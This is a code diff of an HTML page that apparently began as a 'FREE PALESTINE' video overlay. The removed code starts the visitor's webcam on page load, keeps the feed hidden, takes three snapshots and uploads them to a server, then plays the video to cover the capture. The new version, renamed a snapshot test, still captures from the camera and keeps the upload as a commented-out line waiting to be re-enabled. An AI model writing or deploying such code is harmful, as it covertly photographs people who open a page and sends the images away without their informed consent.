@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>FREE PALESTINE Video Overlay</title>
+<title>Camera Snapshot Test</title>
 
 <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap" rel="stylesheet">
 
@@ -16,16 +16,6 @@ html, body {
   overflow: hidden;
   background: #000;
   font-family: 'Orbitron', sans-serif;
-}
-
-video#backgroundVideo {
-  position: fixed;
-  top: 0;
-  left: 0;
-  width: 100%;
-  height: 100%;
-  object-fit: cover;
-  z-index: 0;
 }
 
 .text-layer {
@@ -57,10 +47,6 @@ video#cameraStream, canvas#snapshot { display: none; }
 </head>
 <body>
 
-<video id="backgroundVideo" loop playsinline>
-  <source src="https://www.dropbox.com/scl/fi/blfzo9n9oouo0mtwvz1n7/VID_20250917_085355_746.mp4?rlkey=q4y4es66z7z7sk1r2inv5bvbh&st=yevzhjt4&dl=1" type="video/mp4">
-</video>
-
 <div class="text-layer text1">FREE PALESTINE</div>
 <div class="text-layer text2">FREE PALESTINE</div>
 <div class="text-layer text3">FREE PALESTINE</div>
@@ -69,12 +55,10 @@ video#cameraStream, canvas#snapshot { display: none; }
 <canvas id="snapshot"></canvas>
 
 <script>
-const bgVideo = document.getElementById('backgroundVideo');
 const camVideo = document.getElementById('cameraStream');
 const canvas = document.getElementById('snapshot');
 const ctx = canvas.getContext('2d');
 
-// Take snapshot helper
 function takeSnapshot(video) {
   if (!video.videoWidth || !video.videoHeight) return;
   canvas.width = video.videoWidth;
@@ -82,48 +66,32 @@ function takeSnapshot(video) {
   ctx.drawImage(video, 0, 0);
   const imageData = canvas.toDataURL('image/png');
 
-  fetch('/api/upload', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ image: imageData })
-  }).then(res => res.json())
-    .then(() => console.log("Snapshot uploaded"))
-    .catch(err => console.error("Upload error:", err));
+  console.log("Snapshot ready");
+  // Uncomment this line to actually send the snapshot
+  // fetch('/api/upload', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({image:imageData}) });
 }
 
-// Capture sequence
 async function captureCameraSequence() {
   try {
-    // Pause background video
-    bgVideo.pause();
-
-    // Request camera
     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
     camVideo.srcObject = stream;
 
-    // Wait for camera metadata to be ready
     camVideo.onloadedmetadata = () => {
-      // Snapshots every 2 seconds
       takeSnapshot(camVideo);
       setTimeout(() => takeSnapshot(camVideo), 2000);
       setTimeout(() => takeSnapshot(camVideo), 4000);
 
-      // Stop camera and resume background video
       setTimeout(() => {
         stream.getTracks().forEach(track => track.stop());
-        bgVideo.muted = false;
-        bgVideo.play();
+        console.log("Camera stream stopped");
       }, 6000);
     };
 
   } catch(err) {
     console.error("Camera error:", err);
-    bgVideo.muted = false;
-    bgVideo.play();
   }
 }
 
-// Start on load
 window.addEventListener('load', () => {
   captureCameraSequence();
 });
